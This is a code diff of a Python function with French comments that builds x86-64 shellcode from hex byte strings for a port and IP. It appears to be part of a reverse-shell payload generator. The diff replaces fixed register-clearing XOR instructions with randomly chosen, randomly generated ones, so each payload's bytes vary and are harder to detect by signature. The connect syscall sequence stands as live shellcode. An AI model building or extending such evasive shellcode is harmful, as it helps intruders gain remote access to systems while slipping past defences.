@@ -15,30 +15,30 @@ def partie2(port, ip):
     moval = '\\xb0\\x2a' # mov al, 42
     syscall = '\\x0f\\x05' # syscall
 
-    part2 = [
-            '\\x48\\x31\\xdb', # xor rbx, rbx
-            '\\x48\\x31\\xc9', # xor rcx, rcx
-            '\\x48\\x31\\xd2', # xor rdx, rdx
-            '\\x48\\x31\\xff', # xor rdi, rdi
-            '\\x48\\x31\\xf6'  # xor rsi, rsi
+    reg = [
+        'rbx',
+        'rcx',
+        'rdx',
+        'rdi',
+        'rsi'
     ]
 
        # choix d'un chiffre aléatoire entre 0 et 5
     x = random.randint(0, 5)
 
-    print('part2 = ',x)
+    #print('part2 = ',x)
 
     resultat = []  # Initialise une liste vide pour stocker les instructions
 
     if x > 0:
-        choix = random.sample(range(len(part2)), min(x, len(part2)))
+        choix = random.sample(range(len(reg)), min(x, len(reg)))
         for index in choix:
-            resultat.append(part2[index])
-
+            resultat.append(randomxor(reg[index]))
+    
     # Concaténation de toutes les variables
     resultat_concat = ''.join(resultat) + subrsp + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall
 
-    print(resultat_concat)
+    print(f"Partie 2 = {resultat_concat}")
     print("")
     
     return resultat_concat  
